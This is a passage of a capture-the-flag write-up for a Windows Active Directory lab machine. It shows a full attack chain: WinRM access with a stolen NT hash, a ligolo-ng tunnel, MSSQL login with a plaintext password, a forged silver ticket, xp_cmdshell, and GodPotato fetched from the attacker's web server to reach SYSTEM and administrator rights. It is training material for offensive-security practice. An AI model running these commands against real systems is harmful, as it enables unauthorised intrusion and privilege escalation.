/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.234.66   5985   DC               [+] sendai.vl\mgtsvc$:1cee4a65ef4459e44eb0031cc640ba18 (Pwn3d!)
```
This user does have access over winrm however
## Internal SQL service
```python
*Evil-WinRM* PS C:\Users\mgtsvc$> netstat -ano | findstr 'LISTENING'
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING       680
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       932
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING       680
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING       680
  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING       932
  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING       680
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       1556
```
I found a SQL password stored in a smb share earlier
And there is an internal SQL service on 1433
I can access this service using ligolo-ng
## Using ligolo-ng to access internal SQL service
First ill transfer the agent.exe to the winrm session

```python
python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```
This setup a server on my machine to host the agent

```python
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> wget http://10.10.14.69:1337/agent.exe -o agent.exe
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> dir


    Directory: C:\Users\mgtsvc$\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/3/2026   8:19 AM        7302656 agent.exe
```
This fetched the file to the target, now i can setup the proxy on my attacker machine

```python
sudo ./proxy -selfcert

ligolo-ng » ifcreate --name sendai
INFO[0073] Creating a new sendai interface...           
INFO[0073] Interface created!                           
ligolo-ng » route_add --name sendai --route 240.0.0.1/32
INFO[0114] Route created.                               
ligolo-ng »  
```
This has setup the right routing now i just need to execute it on the target

```python
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> ./agent.exe -connect 10.10.14.69:11601 --ignore-cert
agent.exe : time="2026-03-03T08:30:52-08:00" level=warning msg="warning, certificate validation disabled"
    + CategoryInfo          : NotSpecified: (time="2026-03-0...ation disabled":String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
time="2026-03-03T08:30:52-08:00" level=info msg="Connection established" addr="10.10.14.69:11601"
```
This command connected back to me now i should be able to access the internal service

```python
ligolo-ng » INFO[0204] Agent joined.                                 id=0050569468eb name="SENDAI\\mgtsvc$@dc" remote="10.129.234.66:52534"
ligolo-ng » session
? Specify a session : 1 - SENDAI\mgtsvc$@dc - 10.129.234.66:52534 - 0050569468eb
[Agent : SENDAI\mgtsvc$@dc] » tunnel_start --tun sendai
INFO[0293] Starting tunnel to SENDAI\mgtsvc$@dc (0050569468eb) 
[Agent : SENDAI\mgtsvc$@dc] » 
```
This section shows me starting the tunnel to reach the internal service

```python
mssqlclient.py -windows-auth sendai.vl/sqlsvc:SurenessBlob85@240.0.0.1
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (SENDAI\sqlsvc  guest@master)> 
```
Now on my machine if i use the ip `240.0.0.1` i can reach the internal service
As this current user i cant enable xp_cmdshell
So ill have to find a way to access this service as the administrator
After looking at bloodhound i found a listed SPN for the SQL service account which means i should be able to request a silver ticket

## Silver ticket
```python
echo -n "SurenessBlob85" | iconv -t utf16le | openssl dgst -md4
MD4(stdin)= 58655c0b90b2492f84fb46fa78c2d96a
```
This has generated the hash for me

```python
ticketer.py -nthash 58655c0b90b2492f84fb46fa78c2d96a -domain-sid S-1-5-21-3085872742-570972823-736764132 -domain sendai.vl -spn MSSQL/dc.sendai.vl administrator
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for sendai.vl/administrator
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in administrator.ccache
```
This has create a administrator.ccache which i can use to access the database as the administrator
Now after exporting the ccache i can access the service as the administrator

```python
mssqlclient.py sendai.vl/administrator@DC.sendai.vl -k -no-pass -target-ip 240.0.0.1
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (SENDAI\Administrator  dbo@master)> enable_xp_cmdshell
INFO(DC\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
INFO(DC\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
```
There was a conflict with the domain `sendai.vl` and the ip address used `240.0.0.1` which means i had to temporarily change the ip address in /etc/hosts
Here ive enabled xp_cmdshell
Now its enabled i can use nxc to run commands

```python
nxc mssql 240.0.0.1 -k --use-kcache -x 'whoami /priv' 
MSSQL       240.0.0.1       1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (EncryptionReq:False)
MSSQL       240.0.0.1       1433   DC               [+] sendai.vl\administrator from ccache (Pwn3d!)
MSSQL       240.0.0.1       1433   DC               [+] Executed command via mssqlexec
MSSQL       240.0.0.1       1433   DC               PRIVILEGES INFORMATION
MSSQL       240.0.0.1       1433   DC               ----------------------
MSSQL       240.0.0.1       1433   DC               Privilege Name                Description                               State
MSSQL       240.0.0.1       1433   DC               ============================= ========================================= ========
MSSQL       240.0.0.1       1433   DC               SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
MSSQL       240.0.0.1       1433   DC               SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
MSSQL       240.0.0.1       1433   DC               SeMachineAccountPrivilege     Add workstations to domain                Disabled
MSSQL       240.0.0.1       1433   DC               SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
MSSQL       240.0.0.1       1433   DC               SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
MSSQL       240.0.0.1       1433   DC               SeImpersonatePrivilege        Impersonate a client after authentication Enabled
MSSQL       240.0.0.1       1433   DC               SeCreateGlobalPrivilege       Create global objects                     Enabled
MSSQL       240.0.0.1       1433   DC               SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```
As seen here the `SeImpersonatePrivilege` is enabled which means i can run GodPotato
## GodPotato
First ill download the .exe from github
Now its downloaded ill start a web server on my machine

```python
python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
```
This will host the .exe file

```python
nxc mssql 240.0.0.1 -k --use-kcache -x "powershell -c \"Invoke-WebRequest -Uri http://10.10.14.69:1337/GodPotato-NET4.exe -OutFile C:\Users\sqlsvc\Documents\GodPotato.exe\""
MSSQL       240.0.0.1       1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (EncryptionReq:False)
MSSQL       240.0.0.1       1433   DC               [+] sendai.vl\administrator from ccache (Pwn3d!)
MSSQL       240.0.0.1       1433   DC               [+] Executed command via mssqlexec
```
This fetched the file from my webserver and stored it in the `sqlsvc` documents folder

```python
nxc mssql 240.0.0.1 -k --use-kcache -x 'C:\Users\sqlsvc\Documents\GodPotato.exe -cmd "net localgroup Administrators mgtsvc$ /add"'     
MSSQL       240.0.0.1       1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (EncryptionReq:False)
MSSQL       240.0.0.1       1433   DC               [+] sendai.vl\administrator from ccache (Pwn3d!)
MSSQL       240.0.0.1       1433   DC               [+] Executed command via mssqlexec
MSSQL       240.0.0.1       1433   DC               [*] CombaseModule: 0x140729902104576
MSSQL       240.0.0.1       1433   DC               [*] DispatchTable: 0x140729904691528
MSSQL       240.0.0.1       1433   DC               [*] UseProtseqFunction: 0x140729903984832
MSSQL       240.0.0.1       1433   DC               [*] UseProtseqFunctionParamCount: 6
MSSQL       240.0.0.1       1433   DC               [*] HookRPC
MSSQL       240.0.0.1       1433   DC               [*] Start PipeServer
MSSQL       240.0.0.1       1433   DC               [*] Trigger RPCSS
MSSQL       240.0.0.1       1433   DC               [*] CreateNamedPipe \\.\pipe\93260372-c269-4866-980b-221c78e754bf\pipe\epmapper
MSSQL       240.0.0.1       1433   DC               [*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
MSSQL       240.0.0.1       1433   DC               [*] DCOM obj IPID: 00001402-073c-ffff-f882-7aed380b6c32
MSSQL       240.0.0.1       1433   DC               [*] DCOM obj OXID: 0x9f81df10ed82aa3
MSSQL       240.0.0.1       1433   DC               [*] DCOM obj OID: 0xc93090e203320513
MSSQL       240.0.0.1       1433   DC               [*] DCOM obj Flags: 0x281
MSSQL       240.0.0.1       1433   DC               [*] DCOM obj PublicRefs: 0x0
MSSQL       240.0.0.1       1433   DC               [*] Marshal Object bytes len: 100
MSSQL       240.0.0.1       1433   DC               [*] UnMarshal Object
MSSQL       240.0.0.1       1433   DC               [*] Pipe Connected!
MSSQL       240.0.0.1       1433   DC               [*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
MSSQL       240.0.0.1       1433   DC               [*] CurrentsImpersonationLevel: Impersonation
MSSQL       240.0.0.1       1433   DC               [*] Start Search System Token
MSSQL       240.0.0.1       1433   DC               [*] PID : 932 Token:0x784  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
MSSQL       240.0.0.1       1433   DC               [*] Find System Token : True
MSSQL       240.0.0.1       1433   DC               [*] UnmarshalObject: 0x80070776
MSSQL       240.0.0.1       1433   DC               [*] CurrentUser: NT AUTHORITY\SYSTEM
MSSQL       240.0.0.1       1433   DC               [*] process start with pid 4696
MSSQL       240.0.0.1       1433   DC               The command completed successfully.
```
This command used GodPotato and added the user `mgtsvc$` to the administrators group, so now if i open a new session on winrm i should be an administrator

```python
evil-winrm -i DC.sendai.vl -u mgtsvc$ -H '1cee4a65ef4459e44eb0031cc640ba18'               
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> 
```

```python
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> cd ../../Administrator
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         4/15/2025   8:27 PM             32 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
||1bc134a7b4ae19fcc072082026d991cf||
```
Domain admin!
